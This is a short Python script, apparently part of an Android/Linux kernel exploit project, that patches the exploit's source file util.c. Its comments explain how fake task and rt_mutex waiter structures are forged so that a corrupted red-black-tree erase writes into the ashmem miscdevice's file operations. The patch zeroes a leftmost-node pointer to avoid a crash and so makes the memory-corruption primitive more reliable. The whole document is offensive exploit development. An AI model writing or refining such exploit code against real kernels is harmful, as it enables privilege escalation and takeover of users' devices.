#!/usr/bin/env python3
# Fix rb_next side-effect: __rb_erase_augmented() does
#   if (leftmost && node == *leftmost) *leftmost = rb_next(node);
# With fake_task->pi_waiters.rb_leftmost == &fake_w0->pi_tree_entry and
# node->rb_right == data_addr(ASHMEM_MISC_FOPS), rb_next() walks into the real
# miscdevice and dereferences garbage before the write.
# Setting rb_leftmost != node skips rb_next; rt_mutex_enqueue_pi() (rtmutex.c:724)
# then restores rb_leftmost = &W->pi_tree, so task_top_pi_waiter stays valid.
# The ring-1 write (child->__rb_parent_color = pc) is unchanged.
p = 'src/core/util.c'
s = open(p).read()
a = '''        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);'''
b = '''        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        /* rb_leftmost MUST differ from the erased node, otherwise
         * __rb_erase_augmented() calls rb_next(node) which walks
         * node->rb_right == data_addr(ASHMEM_MISC_FOPS) into the real
         * miscdevice.  enqueue_pi() at rtmutex.c:724 restores it to
         * &W->pi_tree afterwards, so task_top_pi_waiter() stays valid. */
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);'''
assert s.count(a) == 1, s.count(a)
s = s.replace(a, b, 1)
open(p, 'w').write(s)
print('patched util.c: mode-4 pi_waiters.rb_leftmost = 0')
